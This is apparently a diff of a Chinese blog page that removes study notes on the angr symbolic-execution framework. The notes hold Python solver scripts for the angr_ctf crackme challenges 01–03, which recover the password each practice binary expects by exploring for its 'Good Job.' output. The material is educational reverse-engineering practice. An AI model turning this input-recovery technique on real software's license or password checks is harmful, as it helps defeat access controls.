-<h1 id="关于Claripy"><a href="#关于Claripy" class="headerlink" title="关于Claripy"></a>关于Claripy</h1><p><strong>参考文档：<a href="https://docs.angr.io/docs/claripy.html" target="_blank" rel="external">https://docs.angr.io/docs/claripy.html</a></strong>    </p>
-<p>Claripy是angr的一个关于求解程序引擎的库，claripy ASTs提供一种联系具体值和符号表达的方式。</p>
-<p>Claripy这个库总共提供了三种类型的AST：BV,FP,Bool，支持多种类型的数据，比如说bitvector，floating-point number,布尔操作。</p>
-<p><img src="http://osuzegp2h.bkt.clouddn.com/201807104.jpg" alt="images">    </p>
-<h1 id="0x3-03-angr-symbolic-registers"><a href="#0x3-03-angr-symbolic-registers" class="headerlink" title="0x3 03_angr_symbolic_registers"></a>0x3 03_angr_symbolic_registers</h1><p><img src="http://osuzegp2h.bkt.clouddn.com/201807111.jpg" alt="images">    </p>
-<p><img src="http://osuzegp2h.bkt.clouddn.com/201807112.jpg" alt="images">    </p>
-<p><img src="http://osuzegp2h.bkt.clouddn.com/201807113.jpg" alt="images"></p>
-<p><img src="http://osuzegp2h.bkt.clouddn.com/201807114.jpg" alt="images"></p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></div><div class="line"><span class="keyword">import</span> sys,angr</div><div class="line"><span class="keyword">import</span> claripy</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	</div><div class="line">	pro=angr.Project(<span class="string">"./03_angr_symbolic_registers"</span>)</div><div class="line">	</div><div class="line">	<span class="comment">#start_addr:符号执行需要开始的地址</span></div><div class="line">	<span class="comment">#blank_state函数:起始运行地址由addr决定</span></div><div class="line">	<span class="comment">#entry_state函数：起始运行地址由初始运行状态决定</span></div><div class="line">	start_addr=<span class="number">0x80488d1</span></div><div class="line">	state=pro.factory.blank_state(addr=start_addr)</div><div class="line">	</div><div class="line">	<span class="comment">#BVS的作用就是创造一个符号变量</span></div><div class="line">	pwd0=claripy.BVS(<span class="string">'pwd0'</span>,<span class="number">32</span>)</div><div class="line">	pwd1=claripy.BVS(<span class="string">'pwd1'</span>,<span class="number">32</span>)</div><div class="line">	pwd2=claripy.BVS(<span class="string">'pwd2'</span>,<span class="number">32</span>)</div><div class="line">	</div><div class="line">	<span class="comment">#将模拟程序状态的Simstate对象的寄存器设置为符号变量的值,原因看上图（数据放在寄存器里)</span></div><div class="line">	state.regs.eax=pwd0</div><div class="line">	state.regs.ebx=pwd1</div><div class="line">	state.regs.edx=pwd2</div><div class="line">	</div><div class="line">	simulation=pro.factory.simgr(state)</div><div class="line">	</div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">if_success</span><span class="params">(state)</span>:</span></div><div class="line">		stdout_res=state.posix.dumps(sys.stdout.fileno())</div><div class="line">		<span class="keyword">return</span> <span class="string">"Good Job."</span> <span class="keyword">in</span> stdout_res</div><div class="line">	</div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">if_fail</span><span class="params">(state)</span>:</span></div><div class="line">		stdout_res=state.posix.dumps(sys.stdout.fileno())</div><div class="line">		<span class="keyword">return</span> <span class="string">"Try again."</span> <span class="keyword">in</span> stdout_res</div><div class="line">	</div><div class="line">	simulation.explore(find=if_success,avoid=if_fail)</div><div class="line">	</div><div class="line">	<span class="keyword">if</span> simulation.found:</div><div class="line">		solution=simulation.found[<span class="number">0</span>]</div><div class="line">		</div><div class="line">		solution0=solution.se.eval(pwd0)</div><div class="line">		solution1=solution.se.eval(pwd1)</div><div class="line">		solution2=solution.se.eval(pwd2)</div><div class="line">		<span class="comment">#se表示solver engine(符号执行)</span></div><div class="line">		</div><div class="line">        <span class="keyword">print</span> <span class="string">' '</span>.join(map(<span class="string">'&#123;:x&#125;'</span>.format,[solution0,solution1,solution2]))</div><div class="line">		</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yaqing.site/2018/07/10/20180710/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="洋葱">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="洋葱">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/07/10/20180710/" itemprop="url">Angr学习 （二）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-10T09:09:05+08:00">
-                Jul 10 2018
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="0x1-01-angr-avoid"><a href="#0x1-01-angr-avoid" class="headerlink" title="0x1 01_angr_avoid"></a>0x1 01_angr_avoid</h1><p>昨天做了第一题练手之后今天这题就可以照搬了。<br>刚开始可能空格出不来视图会提示太大，只要在options-&gt;general-&gt;graph中把nodes的行数往大里设置。</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> angr,sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line">	pro=angr.Project(<span class="string">"./01_angr_avoid"</span>)</div><div class="line">	</div><div class="line">	entry_addr=pro.factory.entry_state()</div><div class="line">	</div><div class="line">	simulation=pro.factory.simgr(entry_addr)</div><div class="line">	</div><div class="line">	simulation.explore(find=<span class="number">0x080485E0</span>)</div><div class="line">	</div><div class="line">	<span class="keyword">if</span> simulation.found:</div><div class="line">		solution=simulation.found[<span class="number">0</span>]</div><div class="line">		<span class="keyword">print</span> solution.posix.dumps(sys.stdin.fileno())</div><div class="line">		</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">print</span> <span class="string">"Error"</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">	</div><div class="line">	main()</div></pre></td></tr></table></figure>
-<p>跑一下就出来了，这逻辑都不用分析。    </p>
-<h1 id="0x2-02-angr-find-condition"><a href="#0x2-02-angr-find-condition" class="headerlink" title="0x2 02_angr_find_condition"></a>0x2 02_angr_find_condition</h1><p>explore()的参数相当于对到达路径起了约束作用。<br>find参数：程序会在找到对应find条件的states放在一个found list里面<br>avoid参数：与find类似，找到相应的states之后放在avoided lisit里面</p>
-<pre><code class="py"><span class="keyword">import</span> angr,sys
-
-<span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span>
-
-    pro=angr.Project(<span class="string">"./02_angr_find_condition"</span>)
-
-    entry_addr=pro.factory.entry_state()
-
-    simulation=pro.factory.simgr(entry_addr)
-
-    <span class="keyword">print</span> <span class="string">"!"</span>
-
-    <span class="function"><span class="keyword">def</span> <span class="title">success</span><span class="params">(state)</span>:</span>
-        stdout_res=state.posix.dumps(sys.stdout.fileno())
-        <span class="keyword">return</span> <span class="string">'Good Job.'</span> <span class="keyword">in</span> stdout_res
-
-    <span class="function"><span class="keyword">def</span> <span class="title">fail</span><span class="params">(state)</span>:</span>
-        stdout_res=state.posix.dumps(sys.stdout.fileno())
-        <span class="keyword">return</span> <span class="string">'Try again.'</span> <span class="keyword">in</span> stdout_res
-
-    simulation.explore(find=success,avoid=fail)
-
-    <span class="keyword">if</span> simulation.found:
-        solution=simulation.found[<span class="number">0</span>]
-        <span class="keyword">print</span> <span class="string">"1"</span>
-        <span class="keyword">print</span> solution.posix.dumps(sys.stdin.fileno())
-
-    <span class="keyword">else</span>:
-        <span class="keyword">print</span> <span class="string">"Error"</span>
-
-<span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:
-
-    main()
-</code></pre>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -1196,7 +1220,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-count">30</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
